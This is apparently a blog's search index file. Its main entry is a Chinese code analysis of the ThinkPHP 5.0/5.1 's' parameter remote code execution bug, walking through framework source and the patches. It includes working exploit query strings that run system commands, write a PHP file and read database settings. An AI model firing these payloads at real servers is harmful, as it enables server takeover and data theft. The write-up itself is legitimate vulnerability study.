<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>【test】encrypt-test</title>
      <link href="/2019/02/05/encrypt-test/"/>
      <url>/2019/02/05/encrypt-test/</url>
      
        <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="welcome to my blog, enter password to read." />    <label for="pass">welcome to my blog, enter password to read.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19gI7y7TSMSkQvFoht/6gIUHmsi7lBoeaUKNgU8DTWOCEYkAMQQMB0OgZ4IxfU5u2hHvrg2yZ1umdnsEQ3Ce3rDrXKNRnWz5Mo=</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> notes|codereview|ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxxctf|cms|vul|others|cve </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Code Analysis】thinkphp v5.x App.php s参数RCE</title>
      <link href="/2019/02/05/thinkphp-v5-x-App-php-rce/"/>
      <url>/2019/02/05/thinkphp-v5-x-App-php-rce/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>放假了，对thinkphp的几个RCE做一下分析，记录一下XD<br><a id="more"></a></p><h2 id="thinkphp-v5-0-x"><a href="#thinkphp-v5-0-x" class="headerlink" title="thinkphp v5.0.x"></a>thinkphp v5.0.x</h2><h4 id="漏洞相关信息"><a href="#漏洞相关信息" class="headerlink" title="漏洞相关信息"></a>漏洞相关信息</h4><p>漏洞版本：&lt;= 5.0.22<br>补丁：<a href="https://github.com/top-think/framework/commit/4cbc0b5e93314446243ebc7d5f005f9c32864737" target="_blank" rel="noopener">版本更新 · top-think/framework@4cbc0b5 · GitHub</a><br>问题点：library/think/App.php</p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="关于thinkphp的url解析方式"><a href="#关于thinkphp的url解析方式" class="headerlink" title="关于thinkphp的url解析方式"></a>关于thinkphp的url解析方式</h5><p>THINKPHP支持使用PATHINFO的方式来访问具体的模块、类、方法，如<code>index.php/module/controller/action</code><br>对于不支持PATHINFO的服务器，THINKPHP提供了兼容模式<code>?s=/module/controller/action</code>的方式来访问<br>而这次的漏洞成因就是在于兼容模式处理时存在的问题。<br>首先看 <code>thinkphp/library/think/Request.php</code>的<code>pathinfo</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)])) &#123;</span><br><span class="line">            <span class="comment">// 判断URL里面是否有兼容模式参数</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = $_GET[Config::get(<span class="string">'var_pathinfo'</span>)];</span><br><span class="line">            <span class="keyword">unset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">            <span class="comment">// CLI模式下 index.php module/controller/action/params/...</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = <span class="keyword">isset</span>($_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>]) ? $_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>] : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 分析PATHINFO信息</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>($_SERVER[<span class="string">'PATH_INFO'</span>]) ? <span class="string">'/'</span> : ltrim($_SERVER[<span class="string">'PATH_INFO'</span>], <span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>当GET请求中带有s参数(config中默认var_pathinfo为s)，将pathinfo设置为s的参数值<br>有了pathinfo值，我们再找到具体的解析url的函数，<code>thinkphp/library/think/Route.php</code>的<code>parseUrl</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">        $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">        <span class="comment">// 如果有模块/控制器绑定</span></span><br><span class="line">        $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">    &#125;</span><br><span class="line">    $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">    <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">    $route            = [<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中parseUrl函数的<code>$url</code>为上面拿到的pathinfo，<code>$depr</code>为默认的分割符<br>首先对<code>$url</code>替换分割符为<code>|</code>，再输入到<code>parseUrlPath</code>函数(根据<code>/</code>分割)，该函数对pathinfo进行分割，产生<code>module</code>、<code>controller</code>、<code>action</code><br>那么现在来看rce的Poc<code>?s=/index/\think\app/invokefunction</code>=&gt;<code>[module:index,controller:\think\app,action:invokefunction]</code><br>其中controller=&gt;\think\app，是php命名空间的表示方式，\think\app实际调用library/think/App.php，后面的action实际调用的App.php中的invokefunction函数</p><h5 id="漏洞成因点"><a href="#漏洞成因点" class="headerlink" title="漏洞成因点"></a>漏洞成因点</h5><p>上面分析了thinkphp的兼容模式是如何处理s参数的，并且处理存在一个问题就是可以伪造controller，导致实际调用为其他的类和函数<br>看一下拿到module、controller、action后系统的处理<br>thinkphp/library/think/App.php 的 module函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置默认过滤机制</span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(<span class="comment">// 实例化controller类</span></span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前操作名</span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// 执行操作方法</span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// 空操作</span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 操作不存在</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);<span class="comment">// 调用函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>拿到实例化后的对象和方法，动态调用<code>invokeMethod</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span><span class="params">($method, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($method)) &#123;</span><br><span class="line">        $class   = is_object($method[<span class="number">0</span>]) ? $method[<span class="number">0</span>] : <span class="keyword">self</span>::invokeClass($method[<span class="number">0</span>]);</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($class, $method[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 静态方法</span></span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $args = <span class="keyword">self</span>::bindParams($reflect, $vars);<span class="comment">// 获取参数内容 这里获取到参数用做method的参数输入</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">self</span>::$debug &amp;&amp; Log::record(<span class="string">'[ RUN ] '</span> . $reflect-&gt;class . <span class="string">'-&gt;'</span> . $reflect-&gt;name . <span class="string">'[ '</span> . $reflect-&gt;getFileName() . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs(<span class="keyword">isset</span>($class) ? $class : <span class="keyword">null</span>, $args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里使用bindParams函数从get或post中获取到对应的内容，需要注意的是，做参数嵌入时，需要以函数的参数名为键<br>如invokeFunction的参数为<code>$function</code>、<code>$vars</code>，那么在参数中就需要以<code>function=xxx&amp;vars[0]=xxx&amp;vars[1]=xxx</code><br>即poc的后半部分<code>function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20-l</code><br>所以调用链现在变成了</p><ol><li>动态调用\think\app invokeFunction函数</li><li>提供function=call_user_func_array作为invokeFunction动态调用的参数，所以下一步调用call_user_func_array函数</li><li>call_user_func_array的参数为system函数，system函数的参数为ls -l，所以这里用了2维数组</li></ol><p><img src="/attachments/93754c5f.png" alt="93754c5f.png"><br>所以我们可以发散一下思维，我们其实不单单可以调用\think\app这个类，如果其他的类可以任意调用其他函数，或者是调用命令执行函数，同样具有危害性<br>如任意命令执行<br><code>?s=/index/think\view\driver\php/display&amp;content=&lt;?php%20phpinfo();</code><br>任意文件写入，生成在index.php同一级目录<br><code>?s=index/\think\template\driver\file/write&amp;cacheFile=test.php&amp;content=&lt;?php%20phpinfo();</code><br>获取配置信息<br><code>?s=index/\think\config/get&amp;name=database.username</code></p><h2 id="thinkphp-v5-1-x"><a href="#thinkphp-v5-1-x" class="headerlink" title="thinkphp v5.1.x"></a>thinkphp v5.1.x</h2><h4 id="版本信息"><a href="#版本信息" class="headerlink" title="版本信息"></a>版本信息</h4><p>版本：&lt;= v5.1.30<br>补丁信息：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="noopener">修正控制器调用 · top-think/framework@802f284 · GitHub</a><br>漏洞点：thinkphp/library/think/route/dispatch/Module.php</p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>原理同v5.0.x版本类似，也是由于s参数带入的路径解析存在安全问题导致的任意代码执行<br>先看App::run()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 初始化应用</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;initialize();</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;dispatch;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">// 路由检测</span></span><br><span class="line">            $dispatch = <span class="keyword">$this</span>-&gt;routeCheck()-&gt;init();<span class="comment">// 处理module、controller、action</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (HttpResponseException $exception) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">null</span>;</span><br><span class="line">        $data     = $exception-&gt;getResponse();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;middleware-&gt;add(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($dispatch, $data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> is_null($data) ? $dispatch-&gt;run() : $data;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $response = <span class="keyword">$this</span>-&gt;middleware-&gt;dispatch(<span class="keyword">$this</span>-&gt;request);<span class="comment">// 动态调用controller、action</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>App::run()函数体现了程序的一个主要流程，从路径的解析到动态解析执行相应的控制器及方法<br>先来看看第13行，获取相应的路径信息<br>thinkphp/library/think/App.php routeCheck()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测路由缓存</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取应用调度信息</span></span><br><span class="line">    $path = <span class="keyword">$this</span>-&gt;request-&gt;path();</span><br><span class="line">    <span class="comment">// 从Request.php path提取urlpath 具体从pathinfo()，优先获取$_GET[$this-&gt;config['var_pathinfo']]</span></span><br><span class="line">    <span class="comment">// var_pathinfo 默认为s</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否强制路由模式</span></span><br><span class="line">    $must = !is_null(<span class="keyword">$this</span>-&gt;routeMust) ? <span class="keyword">$this</span>-&gt;routeMust : <span class="keyword">$this</span>-&gt;route-&gt;config(<span class="string">'url_route_must'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路由检测 返回一个Dispatch对象</span></span><br><span class="line">    $dispatch = <span class="keyword">$this</span>-&gt;route-&gt;check($path, $must);<span class="comment">//返回UrlDispatch类实例，从dispatch类处继承</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $dispatch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>第7行从s参数中获取路由路径(s为var_pathinfo的默认值)，在调用routeCheck函数后返回一个UrlDispatch，之后调用了Url类的init函数<br>thinkphp/library/think/route/dispatch/Url.php init<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析默认的URL规则</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line">    <span class="comment">// parseUrl函数处理参数值(以/分割，传入|也行会被替换成/，最终由/来分割)，返回[module,controller,action]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>返回Module对象，继承自Dispatch对象，并且调用了init函数，将解析后的路由填充到dispatch，供后面App::run()函数动态调用dispatch的run函数，v5.1版本的调用链复杂了一点，但是其实内容同v5.0版本类似<br>Dispatch::run()函数调用了Module::exec()函数<br>thinkphp/library/think/route/dispatch/Module.php exec()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'module_init'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_controller_layer'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'controller_suffix'</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'empty_controller'</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 闭包调用</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $next)</span> <span class="title">use</span> <span class="params">($instance)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'action_suffix'</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_param_type'</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">'_empty'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">'hook'</span>]-&gt;listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">'middleware'</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">'controller'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简单描述exec函数，实例化controller，用于后面20行到55行的闭包函数，这个必报函数主要完成了调用controller的action，并获取输入的参数值，最后由invokeReflectMethod完成主要的调用。<br>最终的调用函数为Request::filterValue函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">filterValue</span><span class="params">(&amp;$value, $key, $filters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> ($filters <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">            <span class="comment">// 